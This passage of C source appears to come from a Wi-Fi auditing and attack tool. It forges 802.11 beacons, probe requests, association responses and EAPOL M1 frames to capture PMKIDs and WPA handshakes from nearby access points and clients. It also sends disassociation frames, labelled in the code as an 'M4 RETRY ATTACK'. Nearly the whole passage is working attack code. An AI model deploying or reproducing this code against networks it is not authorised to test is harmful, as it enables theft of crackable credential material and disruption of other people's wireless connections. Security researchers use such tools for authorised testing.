if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len +DIRECTEDPROBEREQUEST_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_undirected_proberequest()
{
static mac_t *macftx;

const uint8_t undirectedproberequestdata[] =
{
0x00, 0x00,
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

static uint8_t packetout[1024];

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_mysta, 6);
memcpy(macftx->addr3, &mac_broadcast, 6);
macftx->sequence = myproberequestsequence++ << 4;
if(myproberequestsequence >= 4096)
	{
	myproberequestsequence= 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_broadcastbeacon()
{
mac_t *macftx;
capap_t *capap;

const uint8_t broadcastbeacondata[] =
{
0x00, 0x00,
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
0x03, 0x01, 0x0d,
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
0x2a, 0x01, 0x00,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00, 
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01, 0x20
};
#define BROADCASTBEACON_SIZE sizeof(broadcastbeacondata)

uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE +1];

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myap, 6);
memcpy(macftx->addr3, &mac_myap, 6);
macftx->sequence = mybeaconsequence++ << 4;
if(mybeaconsequence >= 4096)
	{
	mybeaconsequence = 0;
	}
capap = (capap_t*)(packetout +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0x64;
capap->capabilities = 0x431;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &broadcastbeacondata, BROADCASTBEACON_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +0x0e] = channelscanlist[cpa];

if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline bool detectpmkid(uint16_t authlen, uint8_t *authpacket)
{
pmkid_t *pmkid;

if(authlen < WPAKEY_SIZE +PMKID_SIZE)
	{
	return false;
	}
pmkid = (pmkid_t*)(authpacket +WPAKEY_SIZE);

if((pmkid->id != 0xdd) && (pmkid->id != 0x14))
	{
	return false;
	}
if((pmkid->oui[0] != 0x00) && (pmkid->oui[1] != 0x0f) && (pmkid->oui[2] != 0xac))
	{
	return false;
	}
if(pmkid->type != 0x04)
	{
	return false;
	}

if(memcmp(pmkid->pmkid, &nulliv, 16) == 0)
	{
	return false;
	}
return true;
}
/*===========================================================================*/
static inline void process80211eap()
{
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static int eapauthlen;
static uint16_t authlen;
static wpakey_t *wpak;
static uint16_t keyinfo;
static unsigned long long int rc;
int calceapoltimeout;

static exteap_t *exteap;
static uint16_t exteaplen;

eapauthptr = payload_ptr +LLC_SIZE;
eapauthlen = payload_len -LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
if(authlen > (eapauthlen -4))
	{
	return;
	}
if(eapauth->type == EAPOL_KEY)
	{
	wpak = (wpakey_t*)(eapauthptr +EAPAUTH_SIZE);
	keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
	rc = byte_swap_64(wpak->replaycount);
	if(keyinfo == 1)
		{
		if((authlen == 95) && (memcmp(macfrx->addr1, &mac_mysta, 6) == 0))
			{
			addpownedstaap(macfrx->addr1, macfrx->addr2, RX_M1);
			return;
			}
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		if(rc == rcrandom)
			{
			memcpy(&laststam1, macfrx->addr1, 6);
			memcpy(&lastapm1, macfrx->addr2, 6);
			lastrcm1 = rc;
			lasttimestampm1 = timestamp;
			return;
			}
		if(authlen > 95)
			{
			if(detectpmkid(authlen, eapauthptr +EAPAUTH_SIZE) == true)
				{
				if((addpownedstaap(macfrx->addr1, macfrx->addr2, RX_PMKID) & RX_PMKID) != RX_PMKID)
					{
					if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
						{
						printtimenet(macfrx->addr1, macfrx->addr2);
						if(memcmp(macfrx->addr1, &mac_mysta, 6) == 0)
							{
							fprintf(stdout, " [FOUND PMKID CLIENT-LESS]\n");
							}
						else
							{
							fprintf(stdout, " [FOUND PMKID]\n");
							}
						}
					}
				return;
				}
			}
		return;
		}
	if(keyinfo == 3)
		{
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		calceapoltimeout = timestamp -lasttimestampm2;
		if((calceapoltimeout < eapoltimeout) && ((rc -lastrcm2) == 1) && (memcmp(&laststam2,macfrx->addr1, 6) == 0) && (memcmp(&lastapm2, macfrx->addr2, 6) == 0))
			{
			if(addpownedstaap(macfrx->addr1, macfrx->addr2, RX_M23) == false)
				{
				if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
					{
					printtimenet(macfrx->addr1, macfrx->addr2);
					fprintf(stdout, " [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT %d]\n", calceapoltimeout);
					}
				}
			}
		memset(&laststam2, 0, 6);
		memset(&lastapm2, 0, 6);
		lastrcm2 = 0;
		lasttimestampm2 = 0;
		return;
		}
	if(keyinfo == 2)
		{
		calceapoltimeout = timestamp -lasttimestampm1;
		if((rc == rcrandom) && (memcmp(&laststam1, macfrx->addr2, 6) == 0) && (memcmp(&lastapm1, macfrx->addr1, 6) == 0))
			{
			if(fd_pcapng != 0)
				{
				writeepbm2(fd_pcapng);
				}
			if(addpownedstaap(macfrx->addr2, macfrx->addr1, RX_M12) == false)
				{
				if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
					{
					printtimenet(macfrx->addr1, macfrx->addr2);
					fprintf(stdout, " [FOUND HANDSHAKE AP-LESS, EAPOL TIMEOUT %d]\n", calceapoltimeout);
					}
				}
			return;
			}
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		memcpy(&laststam2, macfrx->addr2, 6);
		memcpy(&lastapm2, macfrx->addr1, 6);
		lastrcm2 = rc;
		lasttimestampm2 = timestamp;
		return;
		}
	if(keyinfo == 4)
		{
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		if(checkpownedstaap(macfrx->addr2, macfrx->addr1) == false)
			{
			if(disassociationflag == false)
				{
				send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
				if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
					{
					printtimenet(macfrx->addr1, macfrx->addr2);
					fprintf(stdout, " [EAPOL 4/4 - M4 RETRY ATTACK]\n");
					}
				}
			}
		memset(&laststam2, 0, 6);
		memset(&lastapm2, 0, 6);
		lastrcm2 = 0;
		lasttimestampm2 = 0;
		return;
		}
	else
		{
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		}
	return;
	}
if(eapauth->type == EAP_PACKET)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	exteap = (exteap_t*)(eapauthptr +EAPAUTH_SIZE);
	exteaplen = ntohs(exteap->extlen);
	if((eapauthlen != exteaplen +4) && (exteaplen -= 5))
		{
		return;
		}
	if(exteap->exttype == EAP_TYPE_ID)
		{
		if((exteap->code == EAP_CODE_REQ) && (exteap->data[0] != 0))
			{
			if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
				{
				printtimenet(macfrx->addr1, macfrx->addr2);
				printid(exteaplen -5, exteap->data);
				fprintf(stdout, " [EAP REQUEST ID, SEQUENCE %d]\n", macfrx->sequence >> 4);
				}
			}
		if((exteap->code == EAP_CODE_RESP) && (exteap->data[0] != 0))
			{
			if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
				{
				printtimenet(macfrx->addr1, macfrx->addr2);
				printid(exteaplen -5, exteap->data);
				fprintf(stdout, " [EAP RESPONSE ID, SEQUENCE %d]\n", macfrx->sequence >> 4);
				}
			}
		}
	return;
	}

if(eapauth->type == EAPOL_START)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if(attackclientflag == false)
		{
		send_requestidentity(macfrx->addr2, macfrx->addr1);
		}
	return;
	}
if(eapauth->type == EAPOL_LOGOFF)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	return;
	}
if(eapauth->type == EAPOL_ASF)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	return;
	}
if(eapauth->type == EAPOL_MKA)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	return;
	}

/* for unknown EAP types */
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static void send_m1(uint8_t *macsta, uint8_t *macap)
{
static mac_t *macftx;

static uint8_t anoncewpa2data[] =
{
0x88, 0x02, 0x3a, 0x01,
0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
0x21, 0x22, 0x23, 0x24, 0x25, 0x26,
0x00, 0x00, 0x06, 0x00,
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
};
#define ANONCEWPA2_SIZE sizeof(anoncewpa2data)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macsta) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macsta) == false))
	{
	return;
	}
if(checkpownedstaap(macsta, macap) >= 3) 
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +140);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
memcpy(&packetout[HDRRT_SIZE], &anoncewpa2data, ANONCEWPA2_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);

packetout[HDRRT_SIZE +ANONCEWPA2_SIZE +7] = rcrandom &0xff;
packetout[HDRRT_SIZE +ANONCEWPA2_SIZE +6] = (rcrandom >> 8) &0xff;
memcpy(&packetout[HDRRT_SIZE +ANONCEWPA2_SIZE +8], &anoncerandom, 32);

if(send(fd_socket, packetout, HDRRT_SIZE +133, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
outgoingcount++;
fsync(fd_socket);
macftx->retry = 1;
if(send(fd_socket, packetout, HDRRT_SIZE +133, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
outgoingcount++;
fsync(fd_socket);
return;
}
/*===========================================================================*/
static inline void process80211reassociation_resp()
{
if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
	{
	return;
	}
send_m1(macfrx->addr1, macfrx->addr2);
if((statusout & STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	fprintf(stdout, " [REASSOCIATIONRESPONSE, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static void send_reassociationresponse(uint8_t *macsta, uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t associationresponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

static const uint8_t associationid[] =
{
0x31, 0x04, 0x00, 0x00, 0x00, 0xc0
};
#define ASSOCIATIONID_SIZE sizeof(associationid)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macsta) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macsta) == false))
	{
	return;
	}
if(checkpownedstaap(macsta, macap) > RX_PMKID)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_RESP;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = myassociationresponsesequence++ << 4;
if(myassociationresponsesequence >= 4096)
	{
	myassociationresponsesequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &associationid, ASSOCIATIONID_SIZE);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
outgoingcount++;
fsync(fd_socket);
return;
}
/*===========================================================================*/
static inline void process80211reassociation_req()
{
static uint8_t *essidtag_ptr;
static ietag_t *essidtag;
static uint8_t *reassociationrequest_ptr;
static int reassociationrequestlen;

if(memcmp(&mac_mysta, macfrx->addr2, 6) == 0)
	{
	return;
	}
if(attackclientflag == false)
	{
	if(memcmp(&mac_mysta, macfrx->addr2, 6) != 0)
		{
		send_reassociationresponse(macfrx->addr2, macfrx->addr1);
		usleep(M1WAITTIME);
		send_m1(macfrx->addr2, macfrx->addr1);
		}
	}

if(payload_len < (int)CAPABILITIESSTA_SIZE)
	{
	return;
	}
reassociationrequest_ptr = payload_ptr +CAPABILITIESREQSTA_SIZE;
reassociationrequestlen = payload_len -CAPABILITIESREQSTA_SIZE;
if(reassociationrequestlen < (int)IETAG_SIZE)
	{
	return;
	}

essidtag_ptr = gettag(TAG_SSID, reassociationrequest_ptr, reassociationrequestlen);
if(essidtag_ptr == NULL)
	{
	return;
	}
essidtag = (ietag_t*)essidtag_ptr;
if(essidtag->len > ESSID_LEN_MAX)
	{
	return;
	}
if((essidtag->len == 0) || (essidtag->len > ESSID_LEN_MAX) || (essidtag->data[0] == 0))
	{
	return;
	}

if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}

if((statusout & STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
//	printessid(essidtag_ptr);
	fprintf(stdout, " [REASSOCIATIONREQUEST, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
return;
}
/*===========================================================================*/
static void send_associationresponse(uint8_t *macsta, uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t associationresponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

static const uint8_t associationid[] =
{
0x31, 0x04, 0x00, 0x00, 0x00, 0xc0
};
#define ASSOCIATIONID_SIZE sizeof(associationid)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macsta) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macsta) == false))
	{
	return;
	}
if(checkpownedstaap(macsta, macap) > RX_M1)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = myassociationresponsesequence++ << 4;
if(myassociationresponsesequence >= 4096)
	{
	myassociationresponsesequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &associationid, ASSOCIATIONID_SIZE);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
outgoingcount++;
fsync(fd_socket);
return;
}
/*===========================================================================*/
static inline void process80211association_resp()
{
if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
	{
	return;
	}
send_m1(macfrx->addr1, macfrx->addr2);
if((statusout & STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	fprintf(stdout, " [ASSOCIATIONRESPONSE, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void send_associationrequest(uint8_t *macap)
{
int c;
static mac_t *macftx;
static aplist_t *zeiger;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x0a, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestdata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
0x32, 0x04, 0x0c, 0x12, 0x18, 0x60,
0x21, 0x02, 0x08, 0x14,
0x24, 0x02, 0x01, 0x0d,
0x2d, 0x1a, 0xad, 0x49, 0x17, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x7f, 0x08, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x1e, 0x00, 0x90, 0x4c, 0x33, 0xad, 0x49, 0x17, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00,

};
#define ASSOCIATIONREQUEST_SIZE sizeof(associationrequestdata)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macap) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macap) == false))
	{
	return;
	}

if(checkpownedstaap(mac_mysta, macap) > 0)
	{
	return;
	}

zeiger = aplist;
for(c = 0; c < APLIST_MAX -1; c++)
	{
	if(zeiger->timestamp == 0)
		{
		return;
		}
	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
		{
		memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUEST_SIZE +ESSID_LEN_MAX +RSN_LEN_MAX +6);
		memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
		macftx = (mac_t*)(packetout +HDRRT_SIZE);
		macftx->type = IEEE80211_FTYPE_MGMT;
		macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
		memcpy(macftx->addr1, macap, 6);
		memcpy(macftx->addr2, &mac_mysta, 6);
		memcpy(macftx->addr3, macap, 6);
		macftx->duration = 0x013a;
		macftx->sequence = myassociationrequestsequence++ << 4;
		if(myassociationrequestsequence >= 4096)
			{
			myassociationrequestsequence = 0;
			}
		memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
		packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essid_len;
		memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +2], zeiger->essid, zeiger->essid_len);
		memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2], &associationrequestdata, ASSOCIATIONREQUEST_SIZE);
		packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2 +ASSOCIATIONREQUEST_SIZE] = TAG_RSN;
		packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2 +ASSOCIATIONREQUEST_SIZE +1] = zeiger->rsn_len;
		memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2 +ASSOCIATIONREQUEST_SIZE +1 +1], zeiger->rsn, zeiger->rsn_len);
		if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2 +ASSOCIATIONREQUEST_SIZE +1 +1 +zeiger->rsn_len, 0) < 0)
			{
			errorcount++;
			outgoingcount--;
			}
		outgoingcount++;
		fsync(fd_socket);
		return;
		}
	zeiger++;
	}
return;
}
/*===========================================================================*/
static inline void process80211association_req()
{
static uint8_t *essidtagptr;
static ietag_t *essidtag;
static uint8_t *associationrequestptr;
static int associationrequestlen;

if(memcmp(&mac_mysta, macfrx->addr2, 6) == 0)
	{
	return;
	}
if(attackclientflag == false)
	{
	if(memcmp(&mac_mysta, macfrx->addr2, 6) != 0)
		{
		send_associationresponse(macfrx->addr2, macfrx->addr1);
		usleep(M1WAITTIME);
		send_m1(macfrx->addr2, macfrx->addr1);
		}
	}

if(payload_len < (int)CAPABILITIESSTA_SIZE)
	{
	return;
	}
associationrequestptr = payload_ptr +CAPABILITIESSTA_SIZE;
associationrequestlen = payload_len -CAPABILITIESSTA_SIZE;
if(associationrequestlen < (int)IETAG_SIZE)
	{
	return;
	}

essidtagptr = gettag(TAG_SSID, associationrequestptr, associationrequestlen);
if(essidtagptr == NULL)
	{
	return;
	}
essidtag = (ietag_t*)essidtagptr;
if(essidtag->len > ESSID_LEN_MAX)
	{
	return;
	}
if((essidtag->len == 0) || (essidtag->len > ESSID_LEN_MAX) || (essidtag->data[0] == 0))
	{
	return;
	}

if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}

if((statusout & STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(essidtag->len, essidtag->data);
	fprintf(stdout, " [ASSOCIATIONREQUEST, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
return;
}
/*===========================================================================*/
static inline void process80211authentication()
{
static authf_t *auth;

auth = (authf_t*)payload_ptr;

if(payload_len < (int)AUTHENTICATIONFRAME_SIZE)
	{
	return;
	}

if(macfrx->protected == 1)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, SHARED KEY ENCRYPTED KEY INSIDE], STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
		}
	}
else if(auth->authentication_algho == OPEN_SYSTEM)
	{
	if(attackapflag == false)
		{
		if(memcmp(macfrx->addr1, &mac_mysta, 6) == 0)
			{
			send_associationrequest(macfrx->addr2);
			}
		}
	if(attackclientflag == false)
		{
		if(auth->authentication_seq == 1)
			{
			if(memcmp(macfrx->addr2, &mac_mysta, 6) != 0)
				{
				send_authenticationresponseopensystem(macfrx->addr2, macfrx->addr1);
				}
			}
		}
	if(fd_pcapng != 0)
		{
